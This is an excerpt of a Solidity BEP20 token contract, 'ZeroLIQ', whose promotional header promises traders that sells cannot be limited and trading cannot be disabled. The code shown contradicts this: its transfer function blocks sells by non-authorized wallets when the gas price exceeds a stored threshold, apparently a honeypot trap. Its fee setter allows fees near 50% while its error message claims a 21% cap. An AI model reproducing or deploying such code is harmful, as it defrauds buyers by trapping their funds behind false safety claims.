...
Ownership will eventually be renounced; but all unnecessary write-functions are disabled to guarantee optimal safety for
you as traders: buy's sell's can't be limited, trading can't be disabledl , like:
    * max tax/wallet
    * enable/disable trading
    * whitelist fuction on (nobody can buy if this is the case, only the whitelisted wallets can be used)

Telegram    : https://t.me/ZeroLIQbsc
Twitter     : https://twitter.com/ZeroLIQbsc
...
contract ZeroLIQ is Ownable, IBEP20 {
    ...
    string  _name               = "ZeroLIQ";
    string  _symbol             = "ZEROLQ";
    ...
    function set_Max_Wallet_Holding_Percent(uint256 max_Wallet_Holding_Percent) private onlyOwner {
  	    _maxWalletToken = _totalSupply*max_Wallet_Holding_Percent/100;
  	}

    function set_Max_Transaction_Percent(uint256 max_Transaction_Percent) private onlyOwner() {
        _maxTxAmount = _totalSupply*max_Transaction_Percent/100;
    }

    function setMaxTxAmountAbsolute(uint256 amount) private onlyOwner  {
        _maxTxAmount = amount;
    }

    function setMaxWalletAbsolute(uint256 amount) private onlyOwner  {
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (recipient == pair && !authorizations[sender]) {
            require(tx.gasprice <= gasfee, ">Sell on wallet action"); 
        }
    ...
    function setFees(uint256 _liquidityFee, uint256 _marketingFee, uint256 _ecoFee, uint256 _devFee, uint256 _burnFee, uint256 _feeDenominator) public onlyOwner {
        ...
        require(totalFee < feeDenominator/2, "Fees cannot be more than 21%");
    }
